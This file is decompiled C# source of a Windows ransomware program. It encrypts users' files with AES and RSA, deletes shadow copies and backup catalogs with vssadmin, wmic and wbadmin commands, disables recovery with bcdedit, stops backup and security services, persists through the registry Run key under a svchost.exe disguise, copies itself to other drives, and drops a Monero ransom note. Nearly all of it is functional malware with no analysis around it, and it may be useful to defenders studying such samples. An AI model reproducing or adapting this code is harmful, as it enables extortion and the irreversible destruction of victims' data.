﻿// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.Program
// Assembly: encryptor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 572D9FA7-1DC4-4672-B037-FBD9F6518A86
// Assembly location: C:\Users\victim\Downloads\1461362ebd3b8710610c59cd2aa00f435330bd9d8f75ba4105617b0205cd932b\1461362ebd3b8710610c59cd2aa00f435330bd9d8f75ba4105617b0205cd932b.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  internal class Program
  {
    private static readonly byte[] _salt = new byte[32];
    private static string userName = Environment.UserName;
    private static string userDir = "C:\\Users\\";
    public static string appMutexRun = "v45hchdrg72ns7m6jmy";
    public static bool encryptionAesRsa = true;
    public static string encryptedFileExtension = "";
    private static bool checkSpread = true;
    private static string spreadName = "surprise.exe";
    private static bool checkCopyRoaming = true;
    private static string processName = "svchost.exe";
    public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";
    private static bool checkStartupFolder = true;
    private static bool checkSleep = false;
    private static int sleepTextbox = 10;
    private static string base64Image = "#base64Image";
    public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";
    private static string droppedMessageTextbox = "ReadMe.txt";
    private static bool checkAdminPrivilage = true;
    private static bool checkdeleteShadowCopies = true;
    private static bool checkdisableRecoveryMode = true;
    private static bool checkdeleteBackupCatalog = true;
    private static bool disableTaskManager = true;
    private static bool checkStopBackupServices = true;
    public static string appMutexStartup2 = "19DpJAWr6NCVT2";
    public static string appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;
    public static string staticSplit = "bc";
    public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;
    public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
    private static List<string> messages = new List<string>()
    {
      "What Happened to My Computer?",
      "Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer",
      "accessible. Maybe you're busy looking for a way to recover your files. any attempt to recover your files with a third",
      "party app will result in permenant files curroption",
      "",
      "Can I Recover My Files?",
      "Sure. We guarantee that you will recover all your files safely and easily. But you need to pay and you do not have enough time.",
      "You only have 7 days to submit the payment. After that all your private files will be sold. And, if you don't pay in 30 days,",
      "you won't be able to recover your files forever.",
      "",
      "How Do I Pay?",
      "Payment is accepted in Monero only. Please buy some, And contact us in the tox address mentioned below.",
      "",
      "Tox Address : 30C8CA017B8FD8D8526E6D15CC85C80991F1D9A9FDE034F08E0CB85CB013383034B614877D63",
      "Ransom Amount: 150$",
      "",
      "IMPORTANT: We strongly recommend you to not remove this program, and disable your anti-virus for a while, until you pay and the payment",
      "gets processed. If your anti-virus removes this program, you will not be able to recover your files even if you pay",
      "",
      "",
      "",
      "How to buy monero: https://www.binance.com/en/how-to-buy/monero",
      "Download Tox: https://github.com/qTox/qTox/releases/download/v1.17.6/setup-qtox-x86_64-release.exe"
    };
    private static string[] validExtensions = new string[229]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".mka",
      ".mhtml",
      ".oqy",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".xla",
      ".cub",
      ".dae",
      ".indd",
      ".cs",
      ".mp3",
      ".mp4",
      ".dwg",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".lnk",
      ".dib",
      ".dic",
      ".dif",
      ".divx",
      ".iso",
      ".7zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".mpeg",
      ".torrent",
      ".mpg",
      ".core",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".swf",
      ".cer",
      ".bak",
      ".backup",
      ".accdb",
      ".bay",
      ".p7c",
      ".exif",
      ".vss",
      ".raw",
      ".m4a",
      ".wma",
      ".flv",
      ".sie",
      ".sum",
      ".ibank",
      ".wallet",
      ".css",
      ".js",
      ".rb",
      ".crt",
      ".xlsm",
      ".xlsb",
      ".7z",
      ".cpp",
      ".java",
      ".jpe",
      ".ini",
      ".blob",
      ".wps",
      ".docm",
      ".wav",
      ".3gp",
      ".webm",
      ".m4v",
      ".amv",
      ".m4p",
      ".svg",
      ".ods",
      ".bk",
      ".vdi",
      ".vmdk",
      ".onepkg",
      ".accde",
      ".jsp",
      ".json",
      ".gif",
      ".log",
      ".gz",
      ".config",
      ".vb",
      ".m1v",
      ".sln",
      ".pst",
      ".obj",
      ".xlam",
      ".djvu",
      ".inc",
      ".cvs",
      ".dbf",
      ".tbi",
      ".wpd",
      ".dot",
      ".dotx",
      ".xltx",
      ".pptm",
      ".potx",
      ".potm",
      ".pot",
      ".xlw",
      ".xps",
      ".xsd",
      ".xsf",
      ".xsl",
      ".kmz",
      ".accdr",
      ".stm",
      ".accdt",
      ".ppam",
      ".pps",
      ".ppsm",
      ".1cd",
      ".3ds",
      ".3fr",
      ".3g2",
      ".accda",
      ".accdc",
      ".accdw",
      ".adp",
      ".ai",
      ".ai3",
      ".ai4",
      ".ai5",
      ".ai6",
      ".ai7",
      ".ai8",
      ".arw",
      ".ascx",
      ".asm",
      ".asmx",
      ".avs",
      ".bin",
      ".cfm",
      ".dbx",
      ".dcm",
      ".dcr",
      ".pict",
      ".rgbe",
      ".dwt",
      ".f4v",
      ".exr",
      ".kwm",
      ".max",
      ".mda",
      ".mde",
      ".mdf",
      ".mdw",
      ".mht",
      ".mpv",
      ".msg",
      ".myi",
      ".nef",
      ".odc",
      ".geo",
      ".swift",
      ".odm",
      ".odp",
      ".oft",
      ".orf",
      ".pfx",
      ".p12",
      ".pl",
      ".pls",
      ".safe",
      ".tab",
      ".vbs",
      ".xlk",
      ".xlm",
      ".xlt",
      ".xltm",
      ".svgz",
      ".slk",
      ".tar.gz",
      ".dmg",
      ".ps",
      ".psb",
      ".tif",
      ".rss",
      ".key",
      ".vob",
      ".epsp",
      ".dc3",
      ".iff",
      ".onepkg",
      ".onetoc2",
      ".opt",
      ".p7b",
      ".pam",
      ".r3d"
    };
    private static Random random = new Random();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    private static void Main(string[] args)
    {
      if (Program.forbiddenCountry())
      {
        int num = (int) MessageBox.Show("Forbidden Country");
      }
      else
      {
        if (Program.RegistryValue())
          new Thread((ThreadStart) (() => Program.Run())).Start();
        if (Program.isOver())
          return;
        if (Program.AlreadyRunning())
          Environment.Exit(1);
        if (Program.checkSleep)
          Program.sleepOutOfTempFolder();
        if (Program.checkAdminPrivilage)
          Program.copyResistForAdmin(Program.processName);
        else if (Program.checkCopyRoaming)
          Program.copyRoaming(Program.processName);
        if (Program.checkStartupFolder)
          Program.registryStartup();
        if (Program.checkAdminPrivilage)
        {
          if (Program.checkdeleteShadowCopies)
            Program.deleteShadowCopies();
          if (Program.checkdisableRecoveryMode)
            Program.disableRecoveryMode();
          if (Program.checkdeleteBackupCatalog)
            Program.deleteBackupCatalog();
          if (Program.disableTaskManager)
            Program.DisableTaskManager();
          if (Program.checkStopBackupServices)
            Program.stopBackupServices();
        }
        Program.lookForDirectories();
        if (Program.checkSpread)
          Program.spreadIt(Program.spreadName);
        Program.addAndOpenNote();
        Program.SetWallpaper(Program.base64Image);
      }
    }

    public static void Run() => Application.Run((Form) new driveNotification.NotificationForm());

    private static bool forbiddenCountry()
    {
      string[] strArray = new string[2]
      {
        "az-Latn-AZ",
        "tr-TR"
      };
      foreach (string str in strArray)
      {
        try
        {
          if (InputLanguage.CurrentInputLanguage.Culture.Name == str)
            return true;
        }
        catch
        {
        }
      }
      return false;
    }

    private static void sleepOutOfTempFolder()
    {
      if (!(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
        return;
      Thread.Sleep(Program.sleepTextbox * 1000);
    }

    private static bool RegistryValue()
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\" + Program.appMutexRun2))
        {
          object obj = subKey.GetValue(Program.appMutexRun2);
          subKey.Close();
          return obj.ToString().Length <= 0;
        }
      }
      catch
      {
        return true;
      }
    }

    private static bool AlreadyRunning()
    {
      Process[] processes = Process.GetProcesses();
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in processes)
      {
        try
        {
          if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location)
          {
            if (currentProcess.Id != process.Id)
              return true;
          }
        }
        catch (Exception ex)
        {
        }
      }
      return false;
    }

    public static string RandomString(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string RandomStringForExtension(int length)
    {
      if (!(Program.encryptedFileExtension == ""))
        return Program.encryptedFileExtension;
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string Base64EncodeString(string plainText)
    {
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
    }

        // Token: 0x0600000B RID: 11 RVA: 0x000025FC File Offset: 0x000007FC
        private static void encryptDirectory(string location)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                bool checkCrypted = true;
                Parallel.For(0, files.Length, delegate (int i)
                {
                    try
                    {
                        string extension = Path.GetExtension(files[i]);
                        string fileName = Path.GetFileName(files[i]);
                        if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && fileName != Program.droppedMessageTextbox)
                        {
                            FileInfo fileInfo = new FileInfo(files[i]);
                            try
                            {
                                fileInfo.Attributes = FileAttributes.Normal;
                            }
                            catch
                            {
                            }
                            string text = Program.CreatePassword(40);
                            if (fileInfo.Length < -1926258176L)  // L suffix for long constant
                            {
                                if (Program.checkDirContains(files[i]))
                                {
                                    string keyRSA = Program.RSA_Encrypt(text, Program.rsaKey());
                                    Program.AES_Encrypt(files[i], text, keyRSA);
                                }
                            }
                            else
                            {
                                Program.AES_Encrypt_Large(files[i], text, fileInfo.Length);
                            }
                            if (checkCrypted)
                            {
                                checkCrypted = false;
                                string path = location + "/" + Program.droppedMessageTextbox;
                                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                                if (!File.Exists(path) && location != folderPath)
                                {
                                    File.WriteAllLines(path, Program.messages);
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                    }
                });
                string[] childDirectories = Directory.GetDirectories(location);
                Parallel.For(0, childDirectories.Length, delegate (int i)
                {
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(childDirectories[i]);
                        directoryInfo.Attributes &= ~FileAttributes.Normal;
                    }
                    catch
                    {
                    }
                    Program.encryptDirectory(childDirectories[i]);
                });
            }
            catch (Exception)
            {
            }
        }
        
        private static bool checkDirContains(string directory)
    {
      directory = directory.ToLower();
      string[] strArray = new string[16]
      {
        "appdata\\local",
        "appdata\\locallow",
        "users\\all users",
        "\\ProgramData",
        "boot.ini",
        "bootfont.bin",
        "boot.ini",
        "iconcache.db",
        "ntuser.dat",
        "ntuser.dat.log",
        "ntuser.ini",
        "thumbs.db",
        "autorun.inf",
        "bootsect.bak",
        "bootmgfw.efi",
        "desktop.ini"
      };
      foreach (string str in strArray)
      {
        if (directory.Contains(str))
          return false;
      }
      return true;
    }

    public static string rsaKey()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
      stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
      stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
      stringBuilder.AppendLine("  <Modulus>zX9zzvIxPJ1RCIli+LnxfDPY8zYP2H6f8ZYFLzCNvL8lOv8EFQWAnWobBR5K8V6/sDbRoYBs5B8AS1EcdH9kUCTUrDd1bt4cvE6pM37xTerNHiRiyiGJ06tM8HnnXUuGepqoUswMyCfSSaSnv5s7lD52G4lxzrgLmpjAiakvMCNdKiZQ+rjItTKDnazTKc2l3jj7/iU8jCyNSR4YTCZWQA5Q8+Wnb+KvU0uBwB7p1sI/yav9oJqZZHc442LwFVdpY9wUkNY1pG+o1cFPNjiajleeWq1brivy/PYyG60TBjPkPg51dTmvg3AJ8NmW6rkNKQHZFin/swa2rDd2Nx4i2Q==</Modulus>");
      stringBuilder.AppendLine("</RSAParameters>");
      return stringBuilder.ToString();
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    private static void AES_Encrypt(string inputFile, string password, string keyRSA)
    {
      string path = inputFile + "." + Program.RandomStringForExtension(4);
      byte[] numArray = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      FileStream fileStream1 = new FileStream(path, FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 128;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, numArray, 1);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CBC;
      fileStream1.Write(numArray, 0, numArray.Length);
      CryptoStream destination = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
      fileStream2.CopyTo((Stream) destination);
      fileStream2.Flush();
      fileStream2.Close();
      destination.Flush();
      destination.Close();
      fileStream1.Close();
      using (FileStream fileStream3 = new FileStream(path, FileMode.Append, FileAccess.Write))
      {
        using (StreamWriter streamWriter = new StreamWriter((Stream) fileStream3))
        {
          streamWriter.Write(keyRSA);
          streamWriter.Flush();
          streamWriter.Close();
        }
      }
      File.WriteAllText(inputFile, "?");
      File.Delete(inputFile);
    }

    private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
    {
      Program.GenerateRandomSalt();
      using (FileStream fileStream = new FileStream(inputFile + "." + Program.RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None))
      {
        fileStream.SetLength(lenghtBytes);
        File.WriteAllText(inputFile, "?");
        File.Delete(inputFile);
      }
    }

    public static byte[] GenerateRandomSalt()
    {
      byte[] data = new byte[32];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        for (int index = 0; index < 10; ++index)
          cryptoServiceProvider.GetBytes(data);
      }
      return data;
    }

    public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048))
      {
        try
        {
          cryptoServiceProvider.FromXmlString(publicKeyString.ToString());
          return Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, true));
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
        }
      }
    }

    private static void lookForDirectories()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
        if (drive.ToString() == pathRoot)
        {
          string[] array = new string[12]
          {
            "Program Files",
            "Program Files (x86)",
            "Windows",
            "$Recycle.Bin",
            "MSOCache",
            "Documents and Settings",
            "Intel",
            "PerfLogs",
            "Windows.old",
            "AMD",
            "NVIDIA",
            "ProgramData"
          };
          string[] directories = Directory.GetDirectories(pathRoot);
          for (int index = 0; index < directories.Length; ++index)
          {
            string dirName = new DirectoryInfo(directories[index]).Name;
            if (!Array.Exists<string>(array, (Predicate<string>) (E => E == dirName)))
              Program.encryptDirectory(directories[index]);
          }
        }
        else
          Program.encryptDirectory(drive.ToString());
      }
    }

    private static void copyRoaming(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str3 = str2 + str1;
      if (!(friendlyName != str1) && !(location != str3))
        return;
      byte[] bytes = File.ReadAllBytes(location);
      if (!File.Exists(str3))
      {
        File.WriteAllBytes(str3, bytes);
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str3)
          {
            WorkingDirectory = str2
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
      else
      {
        try
        {
          File.Delete(str3);
          Thread.Sleep(200);
          File.WriteAllBytes(str3, bytes);
        }
        catch
        {
        }
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str3)
          {
            WorkingDirectory = str2
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
    }

    private static void copyResistForAdmin(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str3 = str2 + str1;
      ProcessStartInfo startInfo = new ProcessStartInfo(str3)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str2
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != str1) && !(location != str3))
        return;
      byte[] bytes = File.ReadAllBytes(location);
      if (!File.Exists(str3))
      {
        File.WriteAllBytes(str3, bytes);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str3);
          Thread.Sleep(200);
          File.WriteAllBytes(str3, bytes);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
    }

    private static void addLinkToStartup()
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".url"))
      {
        string location = Assembly.GetExecutingAssembly().Location;
        streamWriter.WriteLine("[InternetShortcut]");
        streamWriter.WriteLine("URL=file:///" + location);
        streamWriter.WriteLine("IconIndex=0");
        string str = location.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static void addAndOpenNote()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      try
      {
        if (!File.Exists(str))
          File.WriteAllLines(str, (IEnumerable<string>) Program.messages);
        Thread.Sleep(500);
        Process.Start(str);
      }
      catch
      {
      }
    }

    private static bool isOver()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.processName;
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      if (location != str)
      {
        try
        {
          File.Delete(path);
        }
        catch
        {
        }
      }
      return File.Exists(path) && location == str;
    }

    private static void registryStartup()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("UpdateTask", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    private static void spreadIt(string spreadName)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != Path.GetPathRoot(Environment.SystemDirectory))
        {
          if (!File.Exists(drive.ToString() + spreadName))
          {
            try
            {
              File.Copy(Assembly.GetExecutingAssembly().Location, drive.ToString() + spreadName);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void deleteShadowCopies()
    {
      Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
    }

    private static void disableRecoveryMode()
    {
      Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
    }

    private static void deleteBackupCatalog()
    {
      Program.runCommand("wbadmin delete catalog -quiet");
    }

    public static void DisableTaskManager()
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey.SetValue("DisableTaskMgr", (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private static void stopBackupServices()
    {
      string[] strArray = new string[42]
      {
        "BackupExecAgentBrowser",
        "BackupExecDiveciMediaService",
        "BackupExecJobEngine",
        "BackupExecManagementService",
        "vss",
        "sql",
        "svc$",
        "memtas",
        "sophos",
        "veeam",
        "backup",
        "GxVss",
        "GxBlr",
        "GxFWD",
        "GxCVD",
        "GxCIMgr",
        "DefWatch",
        "ccEvtMgr",
        "SavRoam",
        "RTVscan",
        "QBFCService",
        "Intuit.QuickBooks.FCS",
        "YooBackup",
        "YooIT",
        "zhudongfangyu",
        "sophos",
        "stc_raw_agent",
        "VSNAPVSS",
        "QBCFMonitorService",
        "VeeamTransportSvc",
        "VeeamDeploymentService",
        "VeeamNFSSvc",
        "veeam",
        "PDVFSService",
        "BackupExecVSSProvider",
        "BackupExecAgentAccelerator",
        "BackupExecRPCService",
        "AcrSch2Svc",
        "AcronisAgent",
        "CASAD2DWebSvc",
        "CAARCUpdateSvc",
        "TeamViewer"
      };
      foreach (string name in strArray)
      {
        try
        {
          new ServiceController(name).Stop();
        }
        catch
        {
        }
      }
    }

    public static void SetWallpaper(string base64)
    {
      if (!(base64 != ""))
        return;
      try
      {
        string str = Path.GetTempPath() + Program.RandomString(9) + ".jpg";
        File.WriteAllBytes(str, Convert.FromBase64String(base64));
        Program.SystemParametersInfo(20U, 0U, str, 3U);
      }
      catch
      {
      }
    }

    public static class NativeMethods
    {
      public const int clp = 797;
      public static IntPtr intpreclp = new IntPtr(-3);

      [DllImport("user32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool AddClipboardFormatListener(IntPtr hwnd);

      [DllImport("user32.dll", SetLastError = true)]
      public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
  }
}